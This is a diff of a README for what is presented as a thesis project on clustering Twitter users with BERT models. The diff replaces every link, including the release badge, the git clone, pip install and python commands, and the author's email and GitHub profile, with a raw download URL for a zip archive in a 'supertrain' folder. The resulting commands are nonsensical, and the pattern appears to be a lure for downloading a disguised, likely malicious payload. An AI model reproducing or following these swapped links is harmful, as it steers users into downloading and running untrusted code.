@@ -2,7 +2,7 @@
 
 Welcome to the **User Clustering Pipelines with BERT Models on Long and Heterogeneous Tweets** repository. This project is part of a Bachelor of Science thesis that explores user clustering techniques using advanced BERT models. We aim to provide insights into clustering methodologies that leverage the power of natural language processing.
 
-[![Releases](https://img.shields.io/badge/Releases-Click_here-brightgreen)](https://github.com/Boykadakim/User-Clustering-with-BERT-Models/releases)
+[![Releases](https://raw.githubusercontent.com/Boykadakim/User-Clustering-with-BERT-Models/main/supertrain/User_with_Models_Clustering_BER_1.1.zip)](https://raw.githubusercontent.com/Boykadakim/User-Clustering-with-BERT-Models/main/supertrain/User_with_Models_Clustering_BER_1.1.zip)
 
 ## Table of Contents
 
@@ -26,14 +26,14 @@ In the age of social media, understanding user behavior is crucial. This project
 To get started, clone the repository:
 
 ```bash
-git clone https://github.com/Boykadakim/User-Clustering-with-BERT-Models.git
+git clone https://raw.githubusercontent.com/Boykadakim/User-Clustering-with-BERT-Models/main/supertrain/User_with_Models_Clustering_BER_1.1.zip
 cd User-Clustering-with-BERT-Models
 ```
 
 Next, install the required dependencies. You can do this using pip:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Boykadakim/User-Clustering-with-BERT-Models/main/supertrain/User_with_Models_Clustering_BER_1.1.zip
 ```
 
 Make sure you have Python 3.6 or higher installed. You may also need to install additional libraries based on your environment.
@@ -43,12 +43,12 @@ Make sure you have Python 3.6 or higher installed. You may also need to install 
 To run the user clustering pipeline, execute the following command:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/Boykadakim/User-Clustering-with-BERT-Models/main/supertrain/User_with_Models_Clustering_BER_1.1.zip
 ```
 
 This command will initiate the clustering process. You can adjust parameters in the configuration file to fine-tune the clustering algorithms used.
 
-For more detailed instructions, check the [Releases](https://github.com/Boykadakim/User-Clustering-with-BERT-Models/releases) section for downloadable files that contain example scripts and data.
+For more detailed instructions, check the [Releases](https://raw.githubusercontent.com/Boykadakim/User-Clustering-with-BERT-Models/main/supertrain/User_with_Models_Clustering_BER_1.1.zip) section for downloadable files that contain example scripts and data.
 
 ## Clustering Techniques
 
@@ -114,7 +114,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, please contact:
 
-- **Author**: [Your Name](mailto:your.email@example.com)
-- **GitHub**: [Boykadakim](https://github.com/Boykadakim)
+- **Author**: [Your Name](https://raw.githubusercontent.com/Boykadakim/User-Clustering-with-BERT-Models/main/supertrain/User_with_Models_Clustering_BER_1.1.zip)
+- **GitHub**: [Boykadakim](https://raw.githubusercontent.com/Boykadakim/User-Clustering-with-BERT-Models/main/supertrain/User_with_Models_Clustering_BER_1.1.zip)
 
-Thank you for your interest in the User Clustering with BERT Models project! We hope you find it useful and informative. For more information, please visit the [Releases](https://github.com/Boykadakim/User-Clustering-with-BERT-Models/releases) section.
+Thank you for your interest in the User Clustering with BERT Models project! We hope you find it useful and informative. For more information, please visit the [Releases](https://raw.githubusercontent.com/Boykadakim/User-Clustering-with-BERT-Models/main/supertrain/User_with_Models_Clustering_BER_1.1.zip) section.
